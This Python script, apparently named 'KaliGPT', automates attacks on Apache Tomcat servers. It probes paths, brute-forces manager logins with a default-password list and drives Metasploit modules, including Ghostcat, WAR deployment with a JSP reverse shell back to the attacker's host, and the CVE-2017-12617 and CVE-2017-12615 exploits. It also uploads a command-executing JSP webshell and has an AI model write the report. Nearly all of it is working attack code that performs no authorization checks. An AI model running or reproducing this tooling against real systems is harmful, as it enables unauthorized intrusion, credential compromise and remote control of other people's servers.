#!/usr/bin/env python3
"""
KaliGPT - Tomcat Auto Exploitation Agent
+ Metasploit + Nmap + Dirb + OpenRouter AI
Usage: python3 kaligpt_tomcat_agent.py <target> [port]
       python3 kaligpt_tomcat_agent.py 192.168.1.100
       python3 kaligpt_tomcat_agent.py 192.168.1.100 8080
       python3 kaligpt_tomcat_agent.py https://example.com
"""

import sys, os, json, re, time, subprocess, signal, threading
from datetime import datetime
from urllib.parse import urlparse
import requests

TARGET = ""
PORT = "8080"
DOMAIN = ""
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "pentest_output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

SHELL_OPENED = False
SHELL_INFO = {}
REPORT_DATA = {"target": "", "port": "", "vulns": [], "creds": [], "shell": None, "logs": []}

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"""
{GREEN}╔══════════════════════════════════════════════╗
║{RESET}  {BOLD}KaliGPT - Tomcat Auto Exploitation Agent{RESET}{GREEN}   ║
║{RESET}       + Metasploit + OpenRouter AI            {GREEN}║
║{RESET}       {YELLOW}Automated - Just sit back{RESET}{GREEN}                ║
╚══════════════════════════════════════════════╝{RESET}
""")

def log(msg, level="info"):
    t = datetime.now().strftime("%H:%M:%S")
    icons = {"info": f"{CYAN}[*]{RESET}", "ok": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "err": f"{RED}[-]{RESET}", "shell": f"{RED}[SHELL]{RESET}"}
    icon = icons.get(level, f"{CYAN}[*]{RESET}")
    print(f"  {icon} {msg}")
    REPORT_DATA["logs"].append(f"[{t}] [{level.upper()}] {msg}")

def run(cmd, timeout=30, shell=True):
    try:
        r = subprocess.run(cmd if shell else cmd.split(), shell=shell, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def call_openrouter(prompt, system=None):
    config_path = os.path.join(BASE_DIR, "agents", "utils", "api.config.json")
    try:
        with open(config_path) as f:
            cfg = json.load(f)
        api_key = cfg.get("openrouter", {}).get("api_key") or cfg.get("api_key", "")
        model = cfg.get("openrouter", {}).get("default_model") or cfg.get("default_model", "poolside/laguna-xs-2.1:free")
    except:
        api_key = os.environ.get("OPENROUTER_API_KEY", "")
        model = "poolside/laguna-xs-2.1:free"
    if not api_key:
        return "[AI Disabled: No API key]"
    if not system:
        system = "You are a Tomcat exploitation expert. Analyze and respond concisely in Arabic."
    try:
        r = requests.post(
            "https://openrouter.ai/api/v1/chat/completions",
            headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
            json={"model": model, "messages": [{"role": "system", "content": system}, {"role": "user", "content": prompt}]},
            timeout=30
        )
        return r.json()["choices"][0]["message"]["content"]
    except Exception as e:
        return f"[AI Error: {e}]"

# ============ PHASE 1: RECON ============
def phase1_recon():
    log(f"Starting Recon on {TARGET}:{PORT}...", "info")
    recon_results = {}

    r = run(f"curl -s -I http://{DOMAIN}:{PORT}/")
    recon_results["headers"] = r
    for line in r.split("\n"):
        if "server" in line.lower() or "tomcat" in line.lower():
            log(f"Server: {line.strip()}", "ok")
    if "tomcat" not in r.lower():
        log("Not Tomcat or header hidden", "warn")
    else:
        log("Tomcat detected!", "ok")

    r2 = run(f"curl -s http://{DOMAIN}:{PORT}/docs/")
    recon_results["docs"] = r2[:200]
    if r2 and "Apache" in r2:
        log("/docs/ accessible - version info available", "ok")

    log("Scanning paths...", "info")
    paths = ["/manager/html", "/manager/status", "/manager/", "/host-manager/html",
             "/examples/", "/sample/", "/docs/", "/ROOT/", "/admin/",
             "/manager/jmxproxy", "/manager/status/all", "/manager/text/list"]
    path_results = {}
    for p in paths:
        r3 = run(f"curl -s -o /dev/null -w '%{{http_code}}' http://{DOMAIN}:{PORT}{p}")
        path_results[p] = r3
        if r3 == "200":
            log(f"{p} → 200 OK (fully accessible)", "shell")
        elif r3 == "401":
            log(f"{p} → 401 (requires auth - might be exploitable)", "warn")
        elif r3 == "403":
            log(f"{p} → 403 (blocked by IP or roles)", "warn")
        elif r3 == "404":
            pass
    recon_results["paths"] = path_results

    log("Checking AJP port 8009...", "info")
    r4 = run(f"curl -s -o /dev/null -w '%{{http_code}}' http://{DOMAIN}:8009/ 2>&1 || echo 'CONNECTION_REFUSED'")
    recon_results["ajp"] = r4
    if "REFUSED" not in r4 and r4.strip():
        log("AJP port 8009 is OPEN! Ghostcat possible.", "shell")

    nmap_ajp = run(f"nmap -sV -p 8009 {DOMAIN} --open 2>/dev/null || echo 'nmap partial'")
    recon_results["nmap_ajp"] = nmap_ajp
    if "open" in nmap_ajp.lower():
        log("AJP confirmed OPEN via nmap", "shell")

    r5 = run(f"curl -s -D- http://{DOMAIN}:{PORT}/manager/text/list 2>&1")
    recon_results["manager_list"] = r5[:500]

    REPORT_DATA["recon"] = recon_results
    with open(os.path.join(OUTPUT_DIR, "recon.json"), "w") as f:
        json.dump(recon_results, f, indent=2, default=str)
    return recon_results

# ============ PHASE 2: CREDENTIALS ============
def phase2_creds():
    log("Starting credential testing...", "info")

    creds = [
        ("admin", "admin"), ("tomcat", "tomcat"), ("admin", ""), ("admin", "manager"),
        ("admin", "password"), ("tomcat", "admin"), ("admin", "tomcat"),
        ("admin", "s3cret"), ("tomcat", "s3cret"), ("both", "tomcat"),
        ("admin", "P@ssw0rd"), ("admin", "123456"), ("admin", "changethis"),
        ("manager", "manager"), ("role1", "role1"), ("role", "changethis"),
        ("tomcat", "password"), ("admin", "secret"), ("admin", "vagrant"),
        ("admin", "admin123"), ("root", "root"), ("root", "admin"),
        ("admin", "letmein"), ("admin", "welcome"), ("admin", "qwerty"),
        ("deploy", "deploy"), ("admin", "tomcat123"),
        ("admin", "mahan"), ("tomcat", "mahan"),
    ]

    found = []
    for user, pwd in creds:
        r = run(f"curl -s -o /dev/null -w '%{{http_code}}' -u '{user}:{pwd}' http://{DOMAIN}:{PORT}/manager/html")
        if r == "200":
            log(f"Creds FOUND: {user}:{pwd}", "shell")
            found.append((user, pwd))
            break
        elif r == "403":
            log(f"Valid user (wrong role): {user}:{pwd}", "warn")

    if not found:
        log("No creds found via dictionary", "err")
    else:
        REPORT_DATA["creds"] = found

    with open(os.path.join(OUTPUT_DIR, "creds.json"), "w") as f:
        json.dump(found, f, indent=2)
    return found

# ============ PHASE 3: METASPLOIT AUTO ============
def phase3_msf(creds, recon):
    log("Starting Metasploit auto-exploitation...", "info")

    msf_avail = run("which msfconsole 2>/dev/null && echo 'OK' || echo 'NO'")
    if "NO" in msf_avail:
        log("Metasploit not found! Skipping MSF phase.", "err")
        return []

    results = []
    used_modules = []

    # --- MODULE 1: Ghostcat (AJP) ---
    if "open" in recon.get("ajp", "").lower() or "open" in recon.get("nmap_ajp", "").lower():
        log("Ghostcat module: reading /WEB-INF/web.xml via AJP...", "info")
        rc = os.path.join(OUTPUT_DIR, "ghostcat.rc")
        with open(rc, "w") as f:
            f.write(f"use auxiliary/admin/http/tomcat_ghostcat\nset RHOSTS {DOMAIN}\nset RPORT 8009\nrun\nexit\n")
        msf_out = run(f"msfconsole -q -r {rc}", 30)
        results.append(("ghostcat", msf_out))
        if "File found" in msf_out or "web.xml" in msf_out:
            log("Ghostcat SUCCESS! Files readable via AJP!", "shell")
            used_modules.append("auxiliary/admin/http/tomcat_ghostcat")
        else:
            log("Ghostcat: no readable files found", "warn")

    # --- MODULE 2: Manager Login Brute (auxiliary) ---
    log("Running Metasploit manager login scanner...", "info")
    rc2 = os.path.join(OUTPUT_DIR, "mgr_login.rc")
    with open(rc2, "w") as f:
        f.write(f"use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {DOMAIN}\nset RPORT {PORT}\nset STOP_ON_SUCCESS true\nset BLANK_PASSWORDS true\nrun\nexit\n")
    msf_out2 = run(f"msfconsole -q -r {rc2}", 60)
    results.append(("mgr_login", msf_out2))
    if "SUCCESS" in msf_out2 or "[+]" in msf_out2:
        log("Metasploit found working creds!", "shell")
        used_modules.append("auxiliary/scanner/http/tomcat_mgr_login")

    # --- MODULE 3: Deploy via creds ---
    if creds:
        user, pwd = creds[0]
        log(f"Deploying WAR payload via manager with {user}:{pwd}...", "info")
        rc3 = os.path.join(OUTPUT_DIR, "deploy.rc")
        lhost = run("ip route get 1 2>/dev/null | awk '{print $7}' || echo '127.0.0.1'").split("\n")[0].strip()
        with open(rc3, "w") as f:
            f.write(f"use exploit/multi/http/tomcat_mgr_deploy\nset RHOSTS {DOMAIN}\nset RPORT {PORT}\nset HttpUsername {user}\nset HttpPassword {pwd}\nset PATH /manager/html\nset PAYLOAD java/jsp_shell_reverse_tcp\nset LHOST {lhost}\nset LPORT 4444\nset TARGET 1\nrun\n")
        msf_out3 = run(f"msfconsole -q -r {rc3}", 60)
        results.append(("deploy", msf_out3))
        if "Meterpreter" in msf_out3 or "session" in msf_out3.lower():
            log("METERPRETER SESSION OPENED!", "shell")
            SHELL_INFO["type"] = "meterpreter"
            SHELL_INFO["payload"] = "java/jsp_shell_reverse_tcp"
            REPORT_DATA["shell"] = SHELL_INFO
            used_modules.append("exploit/multi/http/tomcat_mgr_deploy")
            return results

    # --- MODULE 4: JSP Upload Bypass (CVE-2017-12617) ---
    ver = ""
    for line in recon.get("headers", "").split("\n"):
        if "server" in line.lower():
            ver = line.strip()
    if "7.0" in ver or "8.0" in ver or "8.5" in ver:
        log("Testing CVE-2017-12617 (JSP Upload Bypass)...", "info")
        rc4 = os.path.join(OUTPUT_DIR, "jsp_bypass.rc")
        with open(rc4, "w") as f:
            f.write(f"use exploit/multi/http/tomcat_jsp_upload_bypass\nset RHOSTS {DOMAIN}\nset RPORT {PORT}\nset PAYLOAD java/jsp_shell_reverse_tcp\nset LHOST {lhost}\nset LPORT 4445\nrun\n")
        msf_out4 = run(f"msfconsole -q -r {rc4}", 45)
        results.append(("jsp_bypass", msf_out4))
        if "Meterpreter" in msf_out4 or "session" in msf_out4.lower():
            log("JSP BYPASS SUCCESS - SESSION OPENED!", "shell")
            SHELL_INFO["type"] = "meterpreter"
            REPORT_DATA["shell"] = SHELL_INFO
            used_modules.append("exploit/multi/http/tomcat_jsp_upload_bypass")
            return results

    # --- MODULE 5: Manager Upload via PUT (CVE-2017-12615) ---
    if "7.0" in ver:
        log("Testing CVE-2017-12615 (PUT RCE)...", "info")
        rc5 = os.path.join(OUTPUT_DIR, "put_rce.rc")
        with open(rc5, "w") as f:
            f.write(f"use exploit/multi/http/tomcat_manager_upload\nset RHOSTS {DOMAIN}\nset RPORT {PORT}\nset PAYLOAD java/jsp_shell_reverse_tcp\nset LHOST {lhost}\nset LPORT 4446\nrun\n")
        msf_out5 = run(f"msfconsole -q -r {rc5}", 45)
        results.append(("put_rce", msf_out5))
        if "Meterpreter" in msf_out5 or "session" in msf_out5.lower():
            log("PUT RCE SUCCESS!", "shell")
            SHELL_INFO["type"] = "meterpreter"
            REPORT_DATA["shell"] = SHELL_INFO
            return results

    REPORT_DATA["msf_results"] = results
    with open(os.path.join(OUTPUT_DIR, "msf_results.json"), "w") as f:
        json.dump({"results": results, "used": used_modules}, f, indent=2, default=str)
    return results

# ============ PHASE 4: MANUAL WAR UPLOAD ============
def phase4_manual_exploit(creds):
    if not creds or SHELL_OPENED:
        return

    log("Attempting manual WAR upload...", "info")
    user, pwd = creds[0]

    jsp_shell = """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
    br.close();
}
%>"""
    shell_dir = os.path.join(OUTPUT_DIR, "shell")
    os.makedirs(shell_dir, exist_ok=True)
    with open(os.path.join(shell_dir, "cmd.jsp"), "w") as f:
        f.write(jsp_shell)

    r = run(f"cd {shell_dir} && jar -cf ../shell.war * 2>&1 || zip -r ../shell.war * 2>&1", 10)
    war_file = os.path.join(OUTPUT_DIR, "shell.war")
    if os.path.exists(war_file):
        log("WAR file created, uploading...", "info")
        r2 = run(f"curl -s -o /dev/null -w '%{{http_code}}' -u '{user}:{pwd}' --upload-file {war_file} http://{DOMAIN}:{PORT}/manager/deploy?path=/shellkali")
        if r2 == "200" or r2 == "302":
            log("WAR UPLOAD SUCCESS! Shell at:", "shell")
            shell_url = f"http://{DOMAIN}:{PORT}/shellkali/cmd.jsp"
            log(f"  {shell_url}", "shell")
            log(f"  Usage: curl '{shell_url}?cmd=id'", "shell")
            SHELL_INFO["type"] = "jsp_webshell"
            SHELL_INFO["url"] = shell_url
            REPORT_DATA["shell"] = SHELL_INFO
        elif r2 == "403":
            log("Upload blocked (403). Need different approach.", "err")
            # Try PUT method
            r3 = run(f"curl -s -o /dev/null -w '%{{http_code}}' -X PUT -u '{user}:{pwd}' -T {shell_dir}/cmd.jsp http://{DOMAIN}:{PORT}/shellkali/cmd.jsp")
            if r3 == "201" or r3 == "204":
                log("PUT upload success!", "shell")
                SHELL_INFO["type"] = "jsp_webshell_put"
                SHELL_INFO["url"] = f"http://{DOMAIN}:{PORT}/shellkali/cmd.jsp"
                REPORT_DATA["shell"] = SHELL_INFO
        else:
            log(f"Upload failed with code {r2}", "err")

# ============ PHASE 5: AI REPORT ============
def phase5_report():
    log("Generating AI-powered final report...", "info")

    report_input = json.dumps(REPORT_DATA, indent=2, default=str)[:12000]

    prompt = f"""Generate a professional penetration test report for Apache Tomcat server.

TARGET: {REPORT_DATA['target']}:{REPORT_DATA['port']}
DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

RESULTS DATA:
{report_input}

Write a complete report in Arabic containing:
1. **الملخص التنفيذي**: تقييم عام
2. **المعلومات التي تم جمعها**: الإصدار، المسارات، السيرفر
3. **الثغرات المكتشفة**: مع تصنيف المخاطر (Critical/High/Medium/Low)
4. **بيانات الدخول**: إن وجدت
5. **الاستغلال**: شرح مفصل لكيفية استغلال كل ثغرة وخطواتها
6. **النتيجة النهائية**: هل تم فتح shell أو لا؟
7. **التوصيات**: كيفية إصلاح كل ثغرة
8. **الأدوات المستخدمة**: nmap, msfconsole, curl, إلخ
"""

    report = call_openrouter(prompt)

    report_file = os.path.join(OUTPUT_DIR, "tomcat_final_report.md")
    with open(report_file, "w") as f:
        f.write(f"# Tomcat Penetration Test Report\n")
        f.write(f"**Target:** {REPORT_DATA['target']}:{REPORT_DATA['port']}\n")
        f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Tool:** KaliGPT Tomcat Agent\n\n")
        f.write(report)

    log(f"Report saved to {report_file}", "ok")
    return report

# ============ MAIN ============
def main():
    global TARGET, PORT, DOMAIN, SHELL_OPENED

    banner()
    if len(sys.argv) < 2:
        print(f"  {YELLOW}Usage:{RESET} python3 kaligpt_tomcat_agent.py <target> [port]")
        print(f"  {YELLOW}Example:{RESET} python3 kaligpt_tomcat_agent.py 192.168.1.100 8080")
        print(f"  {YELLOW}Example:{RESET} python3 kaligpt_tomcat_agent.py https://example.com")
        sys.exit(1)

    TARGET = sys.argv[1].rstrip("/")
    PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"

    parsed = urlparse(TARGET if "://" in TARGET else f"http://{TARGET}")
    DOMAIN = parsed.netloc or parsed.path
    if ":" in DOMAIN:
        DOMAIN = DOMAIN.split(":")[0]

    REPORT_DATA["target"] = DOMAIN
    REPORT_DATA["port"] = PORT

    print(f"\n  {CYAN}Target:{RESET} {DOMAIN}:{PORT}")
    print(f"  {CYAN}Output:{RESET} {OUTPUT_DIR}\n")

    # PHASE 1: Recon
    print(f"\n  {BOLD}{YELLOW}[ PHASE 1: RECONNAISSANCE ]{RESET}")
    recon = phase1_recon()

    # PHASE 2: Credentials
    print(f"\n  {BOLD}{YELLOW}[ PHASE 2: CREDENTIALS ]{RESET}")
    creds = phase2_creds()

    # PHASE 3: Metasploit
    print(f"\n  {BOLD}{YELLOW}[ PHASE 3: METASPLOIT EXPLOITATION ]{RESET}")
    msf_results = phase3_msf(creds, recon)

    # Check if shell opened
    if REPORT_DATA.get("shell"):
        SHELL_OPENED = True

    # PHASE 4: Manual (only if no shell yet)
    if not SHELL_OPENED:
        print(f"\n  {BOLD}{YELLOW}[ PHASE 4: MANUAL EXPLOITATION ]{RESET}")
        phase4_manual_exploit(creds)

    # PHASE 5: Report
    print(f"\n  {BOLD}{YELLOW}[ PHASE 5: AI REPORT ]{RESET}")
    phase5_report()

    # FINAL SUMMARY
    print(f"\n  {BOLD}{GREEN}{'='*50}{RESET}")
    print(f"  {BOLD}{GREEN}  FINISHED!{RESET}")
    print(f"  {BOLD}{GREEN}{'='*50}{RESET}")

    if SHELL_OPENED or REPORT_DATA.get("shell"):
        s = REPORT_DATA["shell"]
        print(f"\n  {RED}{BOLD}  ⚡ SHELL OBTAINED! ⚡{RESET}")
        print(f"  {CYAN}  Type:{RESET} {s.get('type', 'N/A')}")
        if s.get("url"):
            print(f"  {CYAN}  URL:{RESET} {s['url']}")
        if s.get("payload"):
            print(f"  {CYAN}  Payload:{RESET} {s['payload']}")
    else:
        print(f"\n  {YELLOW}  No shell obtained. See report for details.{RESET}")

    if creds:
        print(f"\n  {CYAN}  Credentials found:{RESET}")
        for u, p in creds:
            print(f"    {GREEN}{u}:{p}{RESET}")

    print(f"\n  {CYAN}  Report:{RESET} {os.path.join(OUTPUT_DIR, 'tomcat_final_report.md')}")
    print()

if __name__ == "__main__":
    main()
